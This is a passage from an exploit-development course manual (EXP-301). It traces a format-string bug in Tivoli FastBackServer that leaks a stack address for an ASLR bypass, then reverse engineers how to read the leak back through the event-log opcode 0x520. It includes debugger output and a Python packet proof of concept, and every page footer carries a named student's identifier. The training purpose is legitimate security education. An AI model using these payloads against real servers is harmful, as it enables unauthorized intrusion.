0:006> da poi(esp+8) 
0d95ded4  "AGI_S_GetAgentSignature: couldn'" 
0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%" 
0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df94  "x%x%.." 
Listing 639 - Arguments for EventLog_wrapted 
We’ll observe that the formatted string has been shortened, but is otherwise unchanged. 
Stepping into EventLog_wrapted, we’ll find some initial checks followed by a large basic block that 
performs several string modifications. These are all outside of our influence, so we can ignore 
them. 
At the end of the function, we encounter a basic block that calls _ml_vsnprintf once again, as 
displayed in Figure 177. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
514 
 
Figure 177: Second call to ml_vsnprinf 
To analyze the arguments for _ml_vsnprintf, let’s single step to the call and display them. 
eax=0000002d ebx=060fae50 ecx=0d95dca5 edx=000001c7 esi=060fae50 edi=00669360 
eip=004803fa esp=0d95dc14 ebp=0d95dea4 iopl=0         nv up ei pl nz ac po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212 
FastBackServer!EventLog_wrapted+0x2dd: 
004803fa e834ad1d00      call    FastBackServer!ml_vsnprintf (0065b133) 
 
0:006> dds esp L4 
0d95dc14  0d95dca5 
0d95dc18  000001c7 
0d95dc1c  0d95ded4 
0d95dc20  0d95deb8 
 
0:006> da poi(esp+8) 
0d95ded4  "AGI_S_GetAgentSignature: couldn'" 
0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%" 
0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%" 
0d95df94  "x%x%.." 
Listing 640 - Arguments for second vsnprintf 
The formatted string from the first call to _ml_vsnprintf is indeed used as a format string. 
Additionally, the stack pointer present at offset 0xC from ESP will be interpreted as a pointer to an 
array of arguments. It is also worth noting that the result of _ml_vsnprintf is stored at the offset 
label Str. 
Stepping over the call will copy the contents of the arguments array into the format string and 
format it as hexadecimal values. Because we did not supply any arguments, vsnprintf will use any 
values present at that given address. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
515 
The result of this formatting is given in Listing 641. 
0:006> p 
eax=ffffffff ebx=060fae50 ecx=0d95dbd4 edx=00000200 esi=060fae50 edi=00669360 
eip=004803ff esp=0d95dc14 ebp=0d95dea4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog_wrapted+0x2e2: 
004803ff 83c410          add     esp,10h 
 
0:006> da 0d95dca5 
0d95dca5  "AGI_S_GetAgentSignature: couldn'" 
0d95dcc5  "t find agent c4d95ded4782512e780" 
0d95dce5  "5f49474165475f53656741746953746e" 
0d95dd05  "74616e673a657275756f6320276e646c" 
0d95dd25  "696620746120646e746e656725782520" 
0d95dd45  "25782578257825782578257825782578" 
0d95dd65  "25782578257825782578257825782578" 
0d95dd85  "25782578257825782578257825782578" 
0d95dda5  "25782578257825782578257825782578" 
0d95ddc5  "25782578257825782578257825782578" 
0d95dde5  "25782578257825782578257825782578" 
0d95de05  "25782578257825782578257825782578" 
 
0:006> !teb 
TEB at 00205000 
    ExceptionList:        0d9bff38 
    StackBase:            0d9c0000 
    StackLimit:           0d95d000 
    SubSystemTib:         00000000 
    FiberData:            00001e00 
Listing 641 - Leak of stack address 
As highlighted in Listing 641, we find an address (0xd95ded4) at the beginning of the formatted 
hexadecimal values. 
Checking the stack limits, we can verify this address is within the limits and we have managed to 
leak a stack pointer. 
When developing an exploit, it is important to execute it multiple times to ensure 
the consistency of the stack address. 
While valid, this type of ASLR bypass is not immediately useful since the leak happens on the 
server, and we have no known way of obtaining the stack address after it is leaked. 
In the next sections, we’ll learn more about what happens with the leaked stack address following 
the second vsnprintf call, and determine if we can retrieve it from our Kali machine. 
11.2.3.1 Exercise 
1. 
Trace execution to the second vsnprintf call and verify that the custom format string leads to 
a stack leak. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
516 
11.3 Reading the Event Log 
We know from the previous section that FastBackServer contains at least one format string 
function that can be abused to leak a stack address. 
After a stack address has been leaked inside the application, we need to find a way to retrieve it. 
In the next two sections, we will reverse engineer parts of a custom event log for Tivoli that will 
allow us to do just this. 
11.3.1 
The Tivoli Event Log 
We’ll need to develop an attack to return the leaked stack address to our Kali machine. To begin, 
let’s investigate the formatted string containing our leak to determine its intended use. 
Figure 178 shows the last part of the basic block right after the second call to _ml_vsnprintf. 
 
Figure 178: Call to function _SFILE_Printf 
We recall that the formatted string containing our leak is stored at the offset label Str. It is passed 
as an argument to the _SFILE_Printf function. 
The function also takes two other strings as arguments: a format string specifier (“%s”), and a 
static string. Let’s single-step to the call in WinDbg and dump the contents of the static string. 
eax=0d95dc78 ebx=060fae50 ecx=0d95dc78 edx=7efeff2c esi=060fae50 edi=00669360 
eip=00480425 esp=0d95dc18 ebp=0d95dea4 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!EventLog_wrapted+0x308: 
00480425 e86b9b0100      call    FastBackServer!SFILE_Printf (00499f95) 
 
0:006> dds esp L3 
0d95dc18  00a99f40 FastBackServer!EventLOG_sSFILE 
0d95dc1c  0078a8b4 FastBackServer!EVENT_LOG_szModuleNames+0x718 
0d95dc20  0d95dc78 
 
0:006> da poi(esp) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
517 
00a99f40  "C:/ProgramData/Tivoli/TSM/FastBa" 
00a99f60  "ck/server/FAST_BACK_SERVER" 
Listing 642 - Arguments for SFILE_Printf 
It seems that the first argument is a file path or folder. We can try to learn more about it by 
performing a directory listing of C:\ProgramData\Tivoli\TSM\FastBack\server, as shown in Listing 
643. 
C:\Tools> dir C:\ProgramData\Tivoli\TSM\FastBack\server 
 Volume in drive C has no label. 
 Volume Serial Number is 4097-9145 
 
 Directory of C:\ProgramData\Tivoli\TSM\FastBack\server 
 
27/04/2020  16.30    <DIR>          . 
27/04/2020  16.30    <DIR>          .. 
27/04/2020  16.30           435.203 clog010.sf 
08/02/2020  21.52               228 conf.txt 
27/04/2020  16.30               174 conf.txt.sig 
08/02/2020  21.52               228 conf.txt.tmp 
25/04/2020  15.05               614 DebugDumpCreate.txt 
25/11/2019  21.54    <DIR>          FastBackBMR 
26/04/2020  19.21         2.560.003 FAST_BACK_SERVER030.sf 
26/04/2020  20.25         2.560.003 FAST_BACK_SERVER031.sf 
27/04/2020  08.35         2.560.003 FAST_BACK_SERVER032.sf 
27/04/2020  09.39         2.560.003 FAST_BACK_SERVER033.sf 
27/04/2020  10.44         2.560.003 FAST_BACK_SERVER034.sf 
27/04/2020  11.48         2.560.003 FAST_BACK_SERVER035.sf 
27/04/2020  12.52         2.560.003 FAST_BACK_SERVER036.sf 
27/04/2020  13.57         2.560.003 FAST_BACK_SERVER037.sf 
27/04/2020  15.01         2.560.003 FAST_BACK_SERVER038.sf 
27/04/2020  16.06         2.560.003 FAST_BACK_SERVER039.sf 
27/04/2020  22.13           622.851 FAST_BACK_SERVER040.sf 
... 
Listing 643 - Multiple files with custom names 
Listing the directory reveals multiple files that match the argument from _SFILE_Printf, as well as 
a suffix and the .sf extension. 
The number of files with the name varies depending on the length of time 
FastBackServer has been installed on the system. 
This gives us the suspicion that the contents of our format string may be written to one of these 
files. If we inspect the last file, we discover a massive amount of logged information: 
C:\Tools> more C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf 
∩╗┐[Apr 27 16:06:06:960]( ebc)->I4.MGR          :       
CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is 
status                                                                                              
[Apr 27 16:06:07:475]( ebc)->I4.MGR             :       
CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is 
status                                                                                              
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
518 
[Apr 27 16:06:07:991]( ebc)->I4.MGR             :       
CHAIN_MGR_S_CheckSanityStatusAfterReset: Sanity status is [2], waiting for change is 
status                                                                                              
[Apr 27 16:06:08:069]( b94)->I4.FSI             :       REP_FSI_S_GetFullPath: File 
[{}dummy.txt] use size [0]   
... 
Listing 644 - Contents of FAST_BACK_SERVER040.sf 
We can create a hypothesis that Tivoli maintains a custom event log and the purpose of the 
_EventLog function is to write events to it. This means that our formatted string containing a 
stack leak should also be written to it. 
To test this hypothesis, we can navigate into _SFILE_Printf with IDA Pro. At the beginning of the 
function, we locate multiple basic blocks that call the _ml_open function, as shown in Figure 179. 
 
Figure 179: Call to function ml_open 
If we dig into _ml_open, we find it is a wrapper function for wopen378 (Figure 180), which is used to 
open a file and obtain a handle to it. 
 
Figure 180: ml_open is a wrapper for wopen 
To obtain the filename, we can single step in WinDbg until we reach the call to _ml_open and 
dump the arguments. 
 
378 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/open-wopen?view=msvc-160 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
519 
eax=00000040 ebx=060fae50 ecx=0d95d14c edx=0d95da08 esi=060fae50 edi=00669360 
eip=0049a13b esp=0d95d1a0 ebp=0d95dc10 iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_Printf+0x1a6: 
0049a13b e82a081c00      call    FastBackServer!ml_open (0065a96a) 
 
0:006> dds esp L3 
0d95d1a0  0d95da08 
0d95d1a4  00000102 
0d95d1a8  00000180 
 
0:006> da poi(esp) 
0d95da08  "C:/ProgramData/Tivoli/TSM/FastBa" 
0d95da28  "ck/server/FAST_BACK_SERVER040.sf" 
0d95da48  "" 
Listing 645 - Arguments to ml_open 
We’ll 
note 
the 
full 
name 
of 
the 
custom 
event 
log 
file 
as 
C:/ProgramData/Tivoli/TSM/FastBack/server/FAST_BACK_SERVER040.sf, which is supplied to 
_ml_open. 
When a function opens a file, it will typically either read from it or write to it. While SFILE_Printf is a 
large function, a quick browse in IDA Pro reveals several basic blocks with calls to _fwrite,379 
which is typically used to write data to a file. 
An example of one of these basic blocks is shown in Figure 181. 
 
Figure 181: One of the calls to fwrite inside SFILE_Printf 
Instead of analyzing the rest of _SFILE_Printf, let’s attempt to speed up our analysis by letting it 
execute to the end. 
Once the function is complete, we’ll open a PowerShell prompt and list the last entry in the 
custom event log. We can list this entry by using the Get-Content cmdlet380 with the -Tail option 
and a value of “1”. 
 
379 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fwrite/ 
380 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-
content?view=powershell-7 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
520 
PS C:\Tools> Get-Content 
C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER040.sf -Tail 1 
[Apr 28 00:21:55:849](1910)-->W8.AGI            :       AGI_S_GetAgentSignature: 
couldn't find agent 
c4d95ded4782512e7805f49474165475f53656741746953746e74616e673a657275756f6320276e646c696
620746120646e746e65672578252025782578257825782578257825782578257825782578257825 
Listing 646 - Formatted string as an event entry 
We confirm that this is our formatted string and that it still contains the leaked stack address. 
This proves that our hypothesis was correct! 
In this section, we discovered that the Tivoli application maintains a custom event log, and 
confirmed that our formatted string containing a leaked stack address is written to it. Next, we 
need to find a way to obtain content from the custom event log remotely. 
11.3.1.1 Exercise 
1. 
Follow the analysis to uncover the custom event log and locate the stack leak written to it. 
11.3.2 
Remote Event Log Service 
In the previous section, we found that when _EventLog is called, the supplied string is formatted 
and subsequently written to the custom event log. We leveraged this by sending a network packet 
and forced a stack address to be written to the event log. 
To move forward with this exploit and bypass ASLR, we need to retrieve contents from the 
custom event log by sending another network packet. We will uncover a way to access the event 
log remotely in this and the following sections. 
So far, the vulnerability we used has only triggered a write to the event log. There is no way to 
directly retrieve the log because it is stored locally on the server. Instead, we will need to locate a 
different code path to access the event log. 
To start, let’s remember that when _SFILE_Printf is called, a global variable containing a part of the 
log file name is supplied as an argument. This is also shown in Figure 182. 
 
Figure 182: Global variable with event log file name 
Logically, it makes sense that if an application maintains a custom event log, it also contains a 
function to read the log. 
Since this event log is likely shared across all processes related to Tivoli and not just used by 
FastBackServer, we are not guaranteed that it will contain a function to read it. If FastBackServer 
does contain this functionality, it stands to reason that the same global variable would be used. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
521 
To find out if this functionality exists, let’s perform a cross-reference from EventLOG_sSFILE. We 
find five usages, as displayed in Figure 183. 
 
Figure 183: Cross references to the global variable 
We’ll notice that based on the function names, there are only two locations that do not seem 
directy related to the event log. Both usages are in FXCLI_OraBR_Exec_Command, which might 
allow us to reach them. 
If we start by jumping to the address of the cross reference at the bottom, we’ll find the basic 
block given in Figure 184. 
 
Figure 184: Erase event log option? 
It seems that the code path leading to this basic block deletes the content of the custom event 
log. This may indicate a security weakness, since an unauthenticated user can delete the event 
log, but this is not useful for us at the moment. Let’s inspect the other cross-reference instead. 
The other cross-reference leads us to a few basic blocks that perform a series of checks, after 
which they reach the code shown in Figure 185. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
522 
 
Figure 185: Call to _SFILE_ReadBlock 
The function name _SFILE_ReadBlock sounds promising. Entering into the function, we find 
additional checks, and further down we notice a call to fread381 (Figure 201), which is used to read 
from a file. 
 
Figure 186: Call to fread inside _SFILE_ReadBlock 
Given the presence of the fread call and usage of the custom event log file path, it seems as 
though the _SFILE_ReadBlock function may read from the event log. 
Next, we need to find the opcode that will allow us to create a proof of concept and trigger this 
function. 
 
381 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fread/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
523 
Locating the opcode is not particularly straightforward, so we’ll need to perform some analysis. 
First, we will go back to where the global variable containing the file path was used. From this 
location, we can follow the code backward to find an important basic block, as shown in Figure 
187. 
 
Figure 187: Basic block one backwards from desired code path 
We’ll observe two interesting things about the basic block. 
First, when we followed execution backwards, it was from the code path that is taken when the 
JNZ shown in Figure 187 is not taken. This means that the variable used in the comparison must 
contain the value “1”. 
Since the address at offset var_5575C is used as an output buffer for sccanf and in the 
subsequent comparison, we’ll need to provide a correct format string to it. 
Second, the comment in the first line of the basic block reveals that the current basic block is 
reached from a switch statement as case number 8. 
We can backtrack one basic block to locate the assembly code, as given in Figure 188. 
 
Figure 188: Switch statement 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
524 
 
Let’s examine how this jump table works. First, the switch value is moved into ECX and EAX is set 
to zero through the xor instruction. 
Next, the global variable byte_575F6E acts as an array that we index into based on the switch 
value in ECX. The byte at the requested index is moved into AL. 
The retrieved value in AL is next used as an index in the off_575F06 array, followed by the JMP 
instruction to transfer execution. 
From the auto-analysis performed by IDA Pro, we already know that we need a switch value of 8 
to reach the correct code path. 
We can now move backward one more basic block in search of the opcode value. We’ll find the 
basic block shown in Figure 189. In this basic block, we’ll notice the opcode value is being moved 
from EBP+var_61B30 into EDX, after which 0x518 is subtracted from it. 
 
Figure 189: 0x518 subtracted from opcode value 
This means we need to supply an opcode of 0x520 to trigger the event log file read code path. 
0:006> ? 0x520- 0x518 
Evaluate expression: 8 = 00000008 
Listing 647 - Calculation for opcode value 
We are now ready to create the code needed to trigger the correct opcode and supplement our 
static analysis with some dynamic analysis. The code required to trigger opcode 0x520 is a 
repeat of the basic framework we have used before. 
Listing 648 shows the relevant psAgentCommand and psCommandBuffer buffers. 
... 
# psAgentCommand 
buf = pack(">i", 0x400) 
buf += bytearray([0x41]*0xC) 
buf += pack("<i", 0x520)  # opcode 
buf += pack("<i", 0x0)    # 1st memcpy: offset 
buf += pack("<i", 0x100)  # 1st memcpy: size field 
buf += pack("<i", 0x100)  # 2nd memcpy: offset 
buf += pack("<i", 0x100)  # 2nd memcpy: size field 
buf += pack("<i", 0x200)  # 3rd memcpy: offset 
buf += pack("<i", 0x100)  # 3rd memcpy: size field 
buf += bytearray([0x41]*0x8) 
 
# psCommandBuffer 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
525 
buf += b"A" * 0x100   
buf += b"B" * 0x100  
buf += b"C" * 0x100  
 
# Padding 
buf += bytearray([0x41]*(0x404-len(buf))) 
... 
Listing 648 - Proof of concept to trigger opcode 0x520 
To verify that this is the correct opcode, we can set a breakpoint on the basic block that performs 
the call to sscanf. Referencing this in IDA Pro yields the address 0x570E30 in FastBackServer. 
When the breakpoint is set, we can execute the proof of concept and send the network packet. 
0:001> bc * 
 
0:001> bp 570e30 
 
0:001> g 
Breakpoint 0 hit 
eax=00000002 ebx=060fae50 ecx=00000008 edx=00000008 esi=060fae50 edi=00669360 
eip=00570e30 esp=0da5e334 ebp=0dabfe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x497a: 
00570e30 8d959ca8faff    lea     edx,[ebp-55764h] 
Listing 649 - Hitting the breakpoint with opcode 0x520 
The breakpoint triggers, showing that we have successfully navigated into the right code path. 
Now that we can gain execution on the correct code path, we must reach the call to 
_SFILE_ReadBlock. Our next challenge to solve is the call to sscanf, repeated in Figure 190. 
 
Figure 190: Call to sscanf and subsequent comparison 
We’ll recall that the JNZ must not be taken to reach the basic block that calls _SFILE_ReadBlock. 
This means that the value at EBP+var_5575C must be equal to “1”. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
526 
To understand how we can achieve this, let’s reexamine the function prototype of sscanf. 
int sscanf ( const char * s, const char * format, ...); 
Listing 650 - Function prototype of sscanf 
The first argument is the input string that must be processed. The second argument is the format 
string, and any subsequent arguments are used to store the associated values from the input 
string. 
Let’s single step to the call into sscanf to figure out where the input string comes from. 
eax=0da6a738 ebx=060fae50 ecx=0da6a73c edx=0dab3b30 esi=060fae50 edi=00669360 
eip=00570e51 esp=0da5e320 ebp=0dabfe98 iopl=0         nv up ei pl zr na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x499b: 
00570e51 e8cf660f00      call    FastBackServer!sscanf (00667525) 
 
0:001> dd poi(esp) L4 
0dab3b30  41414141 41414141 41414141 41414141 
 
0:001> da poi(esp+4) 
00858598  "FileType: %d ,Start: %d, Length:" 
008585b8  " %d" 
Listing 651 - Arguments for sscanf 
From here, the input string is the first part of the psCommandBuffer that is used with the sscanf 
call. 
As shown in previous modules, the input string must contain the same text as the format string 
for sscanf to correctly parse it. This means that we must modify the first part of the 
psCommandBuffer to contain the format string and insert values associated with the decimal 
format string specifiers. 
Listing 652 shows the updated psCommandBuffer. 
# psCommandBuffer 
buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200)   
buf += b"B" * 0x100  
buf += b"C" * 0x100  
Listing 652 - Updated psCommandBuffer 
We’ll use the required value of “1” along with 0x100 and 0x200 for the three decimal values that 
are parsed from the input string. Choosing different values for each makes it easier to find where 
each of them is used later. 
Next, we can set a breakpoint on the call instruction into sscanf and send the updated packet. 
0:001> bc * 
 
0:001> bp FastBackServer!FXCLI_OraBR_Exec_Command+0x499b 
 
0:001> g 
Breakpoint 0 hit 
eax=0db6a738 ebx=060fae50 ecx=0db6a73c edx=0dbb3b30 esi=060fae50 edi=00669360 
eip=00570e51 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
527 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246 
FastBackServer!FXCLI_OraBR_Exec_Command+0x499b: 
00570e51 e8cf660f00      call    FastBackServer!sscanf (00667525) 
 
0:001> dds esp L5 
0db5e320  0dbb3b30 
0db5e324  00858598 FastBackServer!FX_CLI_JavaVersion+0x1f80 
0db5e328  0db6a73c 
0db5e32c  0db6a738 
0db5e330  0db6a734 
 
0:001> da poi(esp) 
0dbb3b30  "FileType: 1 ,Start: 256, Length:" 
0dbb3b50  " 512BBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
0dbb3b70  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
0dbb3b90  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
0dbb3bb0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
0dbb3bd0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
0dbb3bf0  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
0dbb3c10  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" 
0dbb3c30  "" 
Listing 653 - Updated arguments for sscanf 
We’ll note that our input buffer now contains a valid string. The three output buffers for sscanf, 
given by the three-argument pointers, are also highlighted in the listing above. 
Once we step over the call to sscanf the three decimal values are copied into the output buffers, 
as shown in Listing 654. 
0:001> p 
eax=00000003 ebx=060fae50 ecx=0db5e2f8 edx=0db5e2f8 esi=060fae50 edi=00669360 
eip=00570e56 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202 
FastBackServer!FXCLI_OraBR_Exec_Command+0x49a0: 
00570e56 83c414          add     esp,14h 
 
0:001> dd 0db6a73c L1 
0db6a73c  00000001 
 
0:001> dd 0db6a738 L1 
0db6a738  00000100 
 
0:001> dd 0db6a734 L1 
0db6a734  00000200 
Listing 654 - Parsed values from sscanf 
With the decimal value 1 parsed correctly, let’s clear the comparison and continue towards the 
basic block that calls SFILE_ReadBlock. 
On the way there, we encounter multiple checks that use the two other parsed decimal values. 
Let’s make a note of this and check it later. We can continue until we reach the call: 
eax=018943a8 ebx=060fae50 ecx=00000100 edx=00000200 esi=060fae50 edi=00669360 
eip=00570f03 esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei ng nz ac pe cy 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
528 
FastBackServer!FXCLI_OraBR_Exec_Command+0x4a4d: 
00570f03 e8008ef2ff      call    FastBackServer!SFILE_ReadBlock (00499d08) 
 
0:001> dds esp L4 
0db5e324  00000100 
0db5e328  018943a8 
0db5e32c  00000200 
0db5e330  00a99f40 FastBackServer!EventLOG_sSFILE 
Listing 655 - Arguments for SFILE_ReadBlock 
From the arguments supplied to SFILE_ReadBlock, shown in Listing 655, we find that only the first 
and third arguments are under our control. 
We have succeeded in reaching the correct function with arguments that seem valid. Next, we will 
examine exactly what the SFILE_ReadBlock function does. 
11.3.2.1 Exercise 
1. 
Follow and repeat the analysis to obtain a proof of concept that triggers the correct opcode 
and passes the checks. 
11.3.3 
Read From an Index 
In this section, we will analyze what the SFILE_ReadBlock function does, and what the supplied 
arguments represent. 
We’ll start by stepping into SFILE_ReadBlock. After some initial checks, we reach a call to 
SFILE_S_FindFileIndexForRead, as given in Figure 191. 
 
Figure 191: Call to SFILE_S_FindFileIndexForRead 
Given the name of the function and the goal of reading from the event log, it seems likely that 
SFILE_S_FindFileIndexForRead will find an index that determines which entries can be read. 
Let’s move execution to this point in WinDbg and inspect the arguments to the function. 
0:006> bp FastBackServer!SFILE_ReadBlock+0xa8 
 
0:006> g 
Breakpoint 1 hit 
... 
eax=00000100 ebx=060fae50 ecx=00a99f40 edx=0db5e318 esi=060fae50 edi=00669360 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
529 
eip=00499db0 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc 
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206 
FastBackServer!SFILE_ReadBlock+0xa8: 
00499db0 e807feffff      call    FastBackServer!SFILE_S_FindFileIndexForRead 
(00499bbc) 
 
0:001> dds esp L4 
0db5e0ec  00a99f40 FastBackServer!EventLOG_sSFILE 
0db5e0f0  00000100 
0db5e0f4  0db5e318 
0db5e0f8  0db5e108 
Listing 656 - Arguments for SFILE_S_FindFileIndexForRead 
The only argument we control is the second formatted decimal value. We’ll recall that in the 
format string, it was labeled Start. 
buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200) 
Listing 657 - Format string in our PoC 
This suggests that the value directs where SFILE_ReadBlock will read from in the event log. 
Before moving into the function, we should note that its return value determines whether 
SFILE_ReadBlock triggers the JNZ. Figure 192 shows the graph overview of SFILE_ReadBlock. 
 
Figure 192: Failure path inside SFILE_ReadBlock 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
530 
 
The highlighted portion in the figure above shows the path if the jump is not taken, which leads to 
a premature exit from SFILE_ReadBlock. 
To go further into SFILE_ReadBlock, the return value from SFILE_S_FindFileIndexForRead must be 
non-zero. 
Stepping into SFILE_S_FindFileIndexForRead, we encounter some initial bound checks on the Start 
value. Next we’ll enter a large loop, as shown in Figure 193. 
 
Figure 193: Loop inside SFILE_S_FindFileIndexForRead 
The logic within this loop has multiple implications, so let’s start at a high level and then dig into 
some of the details. 
We already know that SFILE_S_FindFileIndexForRead must exit with a non-zero result. Inspecting 
the code in the three red color-coded basic blocks on the right-hand side would show that they 
return a zero result. 
This leaves only one successful exit from the loop, the green color-coded basic block on the left-
hand side in Figure 193. 
Now that we have a general roadmap of where we want to end up, let’s recall a couple of facts we 
discovered earlier. We found multiple event log files, and the entry containing the leaked stack 
address was added as the newest entry in the file with the number suffix of 40. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Windows User Mode Exploit Development 
 
EXP-301 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
531 
Listing 658 repeats the prior file listings for the event log directory. 
C:\Tools> dir C:\ProgramData\Tivoli\TSM\FastBack\server 
 Volume in drive C has no label. 
 Volume Serial Number is 4097-9145 
 
 Directory of C:\ProgramData\Tivoli\TSM\FastBack\server 
 
... 
26/04/2020  19.21         2.560.003 FAST_BACK_SERVER030.sf 
26/04/2020  20.25         2.560.003 FAST_BACK_SERVER031.sf 
27/04/2020  08.35         2.560.003 FAST_BACK_SERVER032.sf 
27/04/2020  09.39         2.560.003 FAST_BACK_SERVER033.sf 
27/04/2020  10.44         2.560.003 FAST_BACK_SERVER034.sf 
27/04/2020  11.48         2.560.003 FAST_BACK_SERVER035.sf 
27/04/2020  12.52         2.560.003 FAST_BACK_SERVER036.sf 
27/04/2020  13.57         2.560.003 FAST_BACK_SERVER037.sf 
27/04/2020  15.01         2.560.003 FAST_BACK_SERVER038.sf 
27/04/2020  16.06         2.560.003 FAST_BACK_SERVER039.sf 
27/04/2020  22.13           622.851 FAST_BACK_SERVER040.sf 
... 
Listing 658 - Multiple event log files of same size 
From the listing, we’ll note that all event log files with a suffix lower than 40 are the same size. We 
will also find, if we recheck the event logs present in the directory multiple times while the 
application is running, that no file with a suffix greater than 40 exists. On the contrary, event files 
with decreasing numerical suffixes appear. 
Given these facts, our initial thought is that the first log file to be created is the log file with a suffix 
of 40. When it reaches its maximum size, it is renamed to 39, and a new log file with a suffix of 40 
is created. This would continue until the suffix value reaches zero, and then it would eventually be 
overwritten by newer data. 
We are currently interested in reading from the newest file, and the only argument we can control 
is the Start value. It makes sense that this value will control where we read from. 
With a high-level understanding of how the event log works, let’s explore what’s happening inside 
the loop. 
Just before entering the loop, we find the uppermost basic block displayed in Figure 194. 
